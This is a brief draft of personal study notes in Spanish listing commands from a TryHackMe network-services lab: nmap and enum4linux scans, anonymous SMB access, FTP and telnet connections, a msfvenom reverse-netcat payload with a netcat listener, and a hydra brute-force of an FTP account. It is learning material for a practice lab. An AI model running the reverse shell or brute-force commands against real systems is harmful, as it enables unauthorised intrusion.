---
draft: "true"
---

https://tryhackme.com/r/room/networkservices

Comandos usados:
`IP=10.10.188.119`
`nmap -sV $IP`

Para escanear Samba o SMB:
`enum4linux -a $IP`

Para entrar en Samba:
`smbclient //$IP/profiles -U Anonymous -p 445`

Descargar archivo en Samba:
`get "Filename"

Conectar por ssh
`sudo chmod 600 clave`
`ssh -i clave usuario@$IP`

Conectar telnet
`telnet $IP $PORT`

Capturar tráfico
`sudo tcpdump ip proto \\icmp -i tun0`

Creación de un payload sencillo
`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`

Generación de un listener con nc
`nc -lvp 4444`

Conectarte a FTP
`FTP $IP`
`get <file>`


Ataque de fuerza bruta mediante hydra
`hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV $IP ftp`

